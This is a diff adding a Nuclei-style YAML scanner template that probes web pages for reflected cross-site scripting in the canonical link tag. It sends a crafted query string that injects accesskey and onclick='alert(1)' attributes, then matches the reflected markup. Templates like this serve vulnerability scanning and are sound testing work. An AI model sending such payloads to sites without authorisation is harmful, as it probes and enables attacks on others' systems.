@@ -1,0 +1,39 @@
+id: kaue-xss-canonical
+
+info:
+  name: kauexsscanonical
+  author: kauenavarro
+  severity: medium
+  description: Procura por respostas refletidas.
+  tags: xss
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?%27accesskey=%27x%27onclick=%27alert(1)"
+    
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "link rel=canonical href={{BaseURL}}/? accesskey=x onclick=alert(1)%22"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: word
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
+        part: body
+        condition: and
+        negative: true
+
+      - type: status
+        status:
+          - 200
